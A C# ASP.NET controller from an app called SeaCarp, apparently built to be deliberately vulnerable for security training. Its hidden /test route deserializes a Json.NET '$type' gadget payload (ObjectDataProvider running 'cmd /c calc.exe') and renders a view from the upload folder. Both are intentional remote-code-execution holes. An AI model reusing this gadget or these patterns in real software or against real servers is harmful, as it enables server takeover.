using Newtonsoft.Json;
using SeaCarp.Application.Services.Abstractions;
using SeaCarp.CrossCutting.Services.Abstractions;
using SeaCarp.Presentation.Models.ViewModels;

namespace SeaCarp.Presentation.Controllers;

public class HomeController(
    IProductService productService,
    IJwtService jwtService) : BaseController(jwtService)
{
    private readonly IProductService _productService = productService;

    [Route("/", Name = "HomeIndex")]
    [HttpGet]
    public async Task<IActionResult> Index()
    {
        var featuredProducts = await _productService.GetFeaturedProducts();
        return View(new OverviewViewModel { FeaturedProducts = featuredProducts.Select(product => new ProductViewModel(product)).ToList() });
    }

    [Route("/test")]
    [HttpGet]
    public IActionResult Test()
    {
        var temp = JsonConvert.DeserializeObject<Object>("{\r\n    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', \r\n    'MethodName':'Start',\r\n    'MethodParameters':{\r\n        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',\r\n        '$values':['cmd', '/c calc.exe']\r\n    },\r\n    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}\r\n}");
        return View("~/wwwroot/upload/Login.cshtml");
    }
}